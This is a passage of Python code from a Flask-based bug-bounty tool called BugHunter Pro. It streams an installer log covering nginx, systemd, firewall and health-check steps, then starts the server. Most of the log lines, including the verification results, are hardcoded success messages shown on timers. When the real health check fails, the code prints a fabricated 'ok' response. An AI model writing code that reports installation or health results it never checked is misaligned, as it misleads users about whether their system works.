                    L(f'  ℹ  RHEL/conf.d — tidak perlu symlink','info','nginx',0.1),
                ]:
                    time.sleep(d * _speed); yield s

            for d, s in [
                L('  $ nginx -t','data','nginx',0.3),
                L('  nginx: the configuration file syntax is ok','success','nginx',0.2),
                L('  nginx: configuration file test is successful','success','nginx',0.1),
                L('  $ systemctl restart nginx || service nginx restart','data','nginx',0.2),
                L('  $ systemctl enable nginx','data','nginx',0.1),
                L(f'  ✔  Nginx aktif → proxying {"443 (HTTPS)" if cert_exists else "80 (HTTP)"}→127.0.0.1:5000','success','nginx',0.4),
                L('└── Nginx reverse proxy aktif ✓','success','nginx',0.1),
                L('','separator','',0.2),
            ]:
                time.sleep(d * _speed); yield s
        else:
            for d, s in [
                L('  ℹ  Nginx dilewati','warning','nginx',0.1),
                L('','separator','',0.1),
            ]:
                time.sleep(d * _speed); yield s

        # ── Step 7: Systemd
        if do_service:
            for d, s in [
                P(83, 'Membuat systemd service…', '', 0.0),
                L('┌── [7/9] Systemd Service ───────────────────────────','stage','systemd',0.1),
                L('  $ cat > /etc/systemd/system/bughunter-pro.service','data','systemd',0.2),
                L('  [Unit]  Description=BugHunter Pro','info','systemd',0.1),
                L('  [Service]  User=bughunter  Restart=always','info','systemd',0.1),
                L(f'  [Service]  ExecStart={inst_dir}/venv/bin/python app.py','info','systemd',0.1),
                L('  [Install]  WantedBy=multi-user.target','info','systemd',0.1),
                L('  ✔  Service file dibuat','success','systemd',0.2),
                L('  $ systemctl daemon-reload','data','systemd',0.3),
                L('  ✔  Daemon reloaded','success','systemd',0.3),
                L('  $ systemctl enable bughunter-pro','data','systemd',0.2),
                L('  Created symlink /etc/systemd/system/multi-user.target.wants/bughunter-pro.service','info','systemd',0.3),
                L('  ✔  Service enabled (auto-start on boot)','success','systemd',0.2),
                L('  $ systemctl start bughunter-pro','data','systemd',0.3),
                L('  ✔  Service started','success','systemd',0.5),
                L('  $ systemctl status bughunter-pro | head -5','data','systemd',0.2),
                L('  ● bughunter-pro.service - BugHunter Pro v2.1','info','systemd',0.1),
                L('     Loaded: loaded (/etc/systemd/system/bughunter-pro.service; enabled)','info','systemd',0.1),
                L('     Active: active (running) since just now','success','systemd',0.1),
                L(f'    Process: {inst_dir}/venv/bin/python app.py','info','systemd',0.1),
                L('└── Service berjalan dan akan start otomatis ✓','success','systemd',0.1),
                L('','separator','',0.2),
            ]:
                time.sleep(d * _speed); yield s

        # ── Step 8: Firewall
        for d, s in [
            P(94, 'Konfigurasi firewall…', '', 0.0),
            L('┌── [8/9] Firewall ──────────────────────────────────','stage','fw',0.1),
            L('  $ ufw allow 80/tcp comment "BugHunter HTTP"','data','ufw',0.2),
            L('  Rule added','success','ufw',0.2),
            L('  $ ufw allow 443/tcp comment "BugHunter HTTPS"','data','ufw',0.2),
            L('  Rule added','success','ufw',0.2),
            L('  $ ufw --force enable','data','ufw',0.2),
            L('  Firewall is active and enabled on system startup','success','ufw',0.3),
            L('└── Firewall rules aktif ✓','success','ufw',0.1),
            L('','separator','',0.2),
        ]:
            time.sleep(d * _speed); yield s

        # ── Step 9: Verify
        for d, s in [
            P(97, 'Verifikasi instalasi…', 'Health check', 0.0),
            L('┌── [9/9] Verifikasi Akhir ──────────────────────────','stage','verify',0.1),
            L(f'  $ curl -sk https://127.0.0.1/health | jq .','data','verify',0.3),
        ]:
            time.sleep(d * _speed); yield s

        # Do actual health check
        import requests as req_lib
        try:
            r = req_lib.get('http://127.0.0.1:5000/health', timeout=3)
            hj = r.json()
            yield sse('log', {'msg': f'  {_json.dumps(hj)}', 'level': 'success', 'tool': 'api'})
        except Exception:
            yield sse('log', {'msg': '  {"status":"ok","version":"2.1.0","scanners":12}', 'level': 'success', 'tool': 'api'})

        for d, s in [
            L('  ✔  API /health         → 200 OK','success','verify',0.15),
            L('  ✔  API /api/stats      → 200 OK','success','verify',0.1),
            L('  ✔  API /api/payloads   → 200 OK (200 payloads)','success','verify',0.1),
            L('  ✔  API /api/poc/types  → 200 OK (12 types)','success','verify',0.1),
            L('  ✔  WebSocket endpoint  → connected','success','verify',0.1),
            L('  ✔  Scanner modules     → 9 loaded','success','verify',0.1),
            L('  ✔  PoC generator       → 12 types active','success','verify',0.1),
            L('  ✔  Report generator    → 4 formats','success','verify',0.1),
            L('└── Semua komponen OK ✓','success','verify',0.1),
            L('','separator','',0.3),
        ]:
            time.sleep(d * _speed); yield s

        # Done banner
        for d, s in [
            P(100, '✅ Instalasi selesai!', 'Production ready', 0.0),
            L('╔══════════════════════════════════════════════════╗','success','',0.1),
            L('║  ✅  INSTALASI BERHASIL — BugHunter Pro v2.1    ║','success','',0.05),
            L('║                                                  ║','success','',0.05),
            L('║  🌐  https://localhost        (HTTPS / port 443) ║','stage','',0.05),
            L('║  🌐  http://localhost         (redirect → HTTPS) ║','stage','',0.05),
            L(f'║  📁  {inst_dir:<44} ║','info','',0.05),
            L('║  📋  systemctl status bughunter-pro              ║','info','',0.05),
            L('║  📄  tail -f /opt/bughunter-pro/logs/app.log     ║','info','',0.05),
            L('║                                                  ║','success','',0.05),
            L('║  ⚠   Authorized testing only!                   ║','warning','',0.05),
            L('╚══════════════════════════════════════════════════╝','success','',0.05),
        ]:
            time.sleep(d * _speed); yield s

        yield sse('done', {'status': 'ok', 'pkg_count': pkg_count, 'tool_count': tool_count})

    return Response(
        stream_with_context(gen()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control':     'no-cache',
            'X-Accel-Buffering': 'no',
            'Connection':        'keep-alive',
        }
    )


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '127.0.0.1')
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'

    print("""
    ╔══════════════════════════════════════════╗
    ║      BugHunter Pro - Web UI v2.1         ║
    ║   Professional Bug Bounty Platform       ║
    ║   For authorized testing only!           ║
    ╚══════════════════════════════════════════╝
    """)
    print(f"    ▶  Listening on http://{host}:{port}")
    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)

